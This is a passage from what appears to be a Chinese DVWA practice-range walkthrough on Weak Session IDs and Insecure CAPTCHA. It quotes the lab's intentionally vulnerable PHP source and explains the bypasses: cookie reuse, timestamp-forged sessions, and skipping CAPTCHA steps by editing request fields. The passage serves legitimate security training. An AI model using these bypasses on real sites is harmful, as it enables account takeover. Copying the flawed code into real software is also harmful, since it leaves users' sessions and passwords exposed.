<p>漏洞复现：<br>如果session中的last_session_id不存在就设为0，生成cookie时就在cookies上dvwasessionId+1<br>首先点击按钮用burp抓包<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-15-54-45.png" alt="抓包" class="lazyload"><br>将抓到的cookie复制下来：<br><code>Cookie: dvwaSession=1; PHPSESSID=ha1df1ke8hmua8h2d9pd7j11qb; security=low</code><br>然后新打开一个页面，将刚才复制的cookie加入就可以实现直接登录不需要输密码(在这里需要清楚浏览器的cookie值)<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-20-40.png" alt="后续流程" class="lazyload"></p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$html</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&quot;POST&quot;</span>) &#123;<br>    <span class="hljs-variable">$cookie_value</span> = time();<br>    <span class="hljs-comment">//返回当前时间的Unix时间戳，并格式化为日期</span><br>    <span class="hljs-comment">//time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数</span><br>    setcookie(<span class="hljs-string">&quot;dvwaSession&quot;</span>, <span class="hljs-variable">$cookie_value</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里通过时间戳来生成的session，可以通过时间戳转换工具生成时间戳绕过 <a target="_blank" rel="noopener" href="https://tool.lu/timestamp/">时间戳生成工具</a><br>漏洞复现：<br>抓包，保存cookie信息<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-27-39.png" alt="获取cookie信息" class="lazyload"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">Cookie: dvwaSession=1679300781; PHPSESSID=9g6n98glasehppc1148qa3hdr6; security=medium<br></code></pre></td></tr></table></figure>

<p>打开新标签页清空cookie信息，抓包访问靶场的弱会话地址，修改包中的cookie信息<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-33-27.png" alt="改包放行" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-34-41.png" alt="成功访问" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$html</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&quot;POST&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id_high&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id_high&#x27;</span>] = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id_high&#x27;</span>]++;<br>    <span class="hljs-variable">$cookie_value</span> = md5(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id_high&#x27;</span>]);<br>    setcookie(<span class="hljs-string">&quot;dvwaSession&quot;</span>, <span class="hljs-variable">$cookie_value</span>, time()+<span class="hljs-number">3600</span>, <span class="hljs-string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>], <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    setcookie(name,value,expire,path,domain,secure,httponly)</span><br><span class="hljs-comment">    参数                  描述</span><br><span class="hljs-comment">    name         必需。规定cookie的名称。</span><br><span class="hljs-comment">    value         必需。规定cookie的值。</span><br><span class="hljs-comment">    expire       可选。规定cookie的有效期。</span><br><span class="hljs-comment">    path         可选。规定cookie的服务器路径。</span><br><span class="hljs-comment">    domain         可选。规定cookie的域名。</span><br><span class="hljs-comment">    secure         可选。规定是否通过安全的HTTPS连接来传输cookie。</span><br><span class="hljs-comment">    httponly     可选。规定是否Cookie仅可通过HTTP协议访问。</span><br><span class="hljs-comment">    */</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>发现sessionId，这种使用了md5解密进行尝试发现是个2，猜测可能是low级别上进行md5加密<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-53-50.png" alt="查看" class="lazyload"><br>查看session的值是low的进行md5加密<br>其余操作步骤和low相同</p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$html</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&quot;POST&quot;</span>) &#123;<br>    <span class="hljs-variable">$cookie_value</span> = sha1(mt_rand() . time() . <span class="hljs-string">&quot;Impossible&quot;</span>);<br>    <span class="hljs-comment">//随机数+时间戳+固定字符impossible在进行sha1运算</span><br>    setcookie(<span class="hljs-string">&quot;dvwaSession&quot;</span>, <span class="hljs-variable">$cookie_value</span>, time()+<span class="hljs-number">3600</span>, <span class="hljs-string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>], <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里$cookie_value采用随机数+时间戳+固定字符串”Impossible”，再进行sha1运算，完全不能猜测到dvwaSession的值。</p>
<h2 id="DVWA-–-Insecure-CAPTCHA-不安全的验证码"><a href="#DVWA-–-Insecure-CAPTCHA-不安全的验证码" class="headerlink" title="DVWA – Insecure CAPTCHA(不安全的验证码)"></a>DVWA – Insecure CAPTCHA(不安全的验证码)</h2><p>不安全的验证码(insecure captcha)全程Completely Automated Public Turing Test to Tell Computers and Humans Apart，中文名是全自动区分计算机和人类的图灵测试，关于这一项其实是在验证码的流程出现了逻辑漏洞。<br>验证流程：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-17-02-30.png" alt="验证流程" class="lazyload"></p>
<p>在这里由于访问不到Google的验证码api，过于麻烦还需要翻墙，只需要明白漏洞原理即可。</p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//第一阶段，验证身份 验证阶段step为1</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;step&#x27;</span> ] == <span class="hljs-string">&#x27;1&#x27;</span> ) ) &#123;<br>    <span class="hljs-comment">// Hide the CAPTCHA form 隐藏验证码表单</span><br>    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// Get input 得到用户的新密码及确认密码</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check CAPTCHA from 3rd party 使用第三方进行身份验证</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    recaptcha_check_answer($privkey,$remoteip, $challenge,$response)</span><br><span class="hljs-comment">    参数$privkey是服务器申请的private key，$remoteip是用户的ip，$challenge是recaptcha_challenge_field字段的值，来自前端页面 ，$response是recaptcha_response_field字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse类有2个属性 ：</span><br><span class="hljs-comment">    $is_valid是布尔型的，表示校验是否有效，</span><br><span class="hljs-comment">    $error是返回的错误代码。</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-variable">$resp</span> = recaptcha_check_answer(<br>        <span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">&#x27;recaptcha_private_key&#x27;</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;g-recaptcha-response&#x27;</span>]<br>    );<br><br>    <span class="hljs-comment">// Did the CAPTCHA fail? 验证失败时</span><br>    <span class="hljs-keyword">if</span>( !<span class="hljs-variable">$resp</span> ) &#123;<br>        <span class="hljs-comment">// What happens when the CAPTCHA was entered incorrectly</span><br>        <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// CAPTCHA was correct. Do both new passwords  match? 验证通过时，匹配两次密码是否一致</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>            <span class="hljs-comment">// Show next stage for the user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span><br><span class="hljs-string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="hljs-subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="hljs-subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span><br><span class="hljs-string">                &lt;/form&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Both new passwords do not match.</span><br>            <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;<br>            <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//第二阶段，检查两次密码是否一致，并更新密码</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;step&#x27;</span> ] == <span class="hljs-string">&#x27;2&#x27;</span> ) ) &#123;<br>    <span class="hljs-comment">// Hide the CAPTCHA form</span><br>    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check to see if both password match</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>        <span class="hljs-comment">// They do!</span><br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-variable">$pass_new</span> = md5( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update database</span><br>        <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for the end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with the passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>源码分析总共分为两个阶段：</p>
<ol>
<li>对用户的身份进行验证，step为1，验证成功后才能进行密码修改</li>
<li>step为2，两次输入的密码一致可以进行修改</li>
</ol>
<p>我们考虑直接跳过第一阶段，输入一密码一致，burp抓包修改step的值进行直接改密码。</p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;step&#x27;</span> ] == <span class="hljs-string">&#x27;1&#x27;</span> ) ) &#123;<br>    <span class="hljs-comment">// Hide the CAPTCHA form</span><br>    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check CAPTCHA from 3rd party</span><br>    <span class="hljs-variable">$resp</span> = recaptcha_check_answer(<br>        <span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">&#x27;recaptcha_private_key&#x27;</span> ],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;g-recaptcha-response&#x27;</span>]<br>    );<br><br>    <span class="hljs-comment">// Did the CAPTCHA fail?</span><br>    <span class="hljs-keyword">if</span>( !<span class="hljs-variable">$resp</span> ) &#123;<br>        <span class="hljs-comment">// What happens when the CAPTCHA was entered incorrectly</span><br>        <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// CAPTCHA was correct. Do both new passwords match?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>            <span class="hljs-comment">// Show next stage for the user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span><br><span class="hljs-string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="hljs-subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="hljs-subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span><br><span class="hljs-string">                &lt;/form&gt;&quot;</span>;<br>                <span class="hljs-comment">//对参数passed_captcha进行验证，如果通过身份验证，该参数就为true</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Both new passwords do not match.</span><br>            <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;<br>            <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;step&#x27;</span> ] == <span class="hljs-string">&#x27;2&#x27;</span> ) ) &#123;<br>    <span class="hljs-comment">// Hide the CAPTCHA form</span><br>    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check to see if they did stage 1</span><br>    <span class="hljs-keyword">if</span>( !<span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;passed_captcha&#x27;</span> ] ) &#123;<br>        <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Check to see if both password match</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>        <span class="hljs-comment">// They do!</span><br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-variable">$pass_new</span> = md5( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update database</span><br>        <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for the end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with the passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>与Low相比怎加了一个passed_capt，当passed_capt为true时可以修改密码，同样使用抓包修改相关值</p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?php<br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Hide the CAPTCHA form</span><br>    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check CAPTCHA from 3rd party</span><br>    <span class="hljs-variable">$resp</span> = recaptcha_check_answer(<br>        <span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">&#x27;recaptcha_private_key&#x27;</span> ],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;g-recaptcha-response&#x27;</span>]<br>    );<br><span class="hljs-comment">//（通过身份验证条件）或者 （参数g-recaptcha-respon为hidd3n_valu3并且参数 HTTP_USER_AGE为 reCAPTC）就算是验证通过了</span><br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-variable">$resp</span> || <br>        (<br>            <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="hljs-string">&#x27;hidd3n_valu3&#x27;</span><br>            &amp;&amp; <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="hljs-string">&#x27;reCAPTCHA&#x27;</span><br>        )<br>    )&#123;<br>        <span class="hljs-comment">// CAPTCHA was correct. Do both new passwords match?</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span>) &#123;<br>            <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>            <span class="hljs-variable">$pass_new</span> = md5( <span class="hljs-variable">$pass_new</span> );<br><br>            <span class="hljs-comment">// Update database</span><br>            <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="hljs-string">&quot;&#x27; LIMIT 1;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>            <span class="hljs-comment">// Feedback for user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Ops. Password mismatch</span><br>            <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;<br>            <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// What happens when the CAPTCHA was entered incorrectly</span><br>        <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span 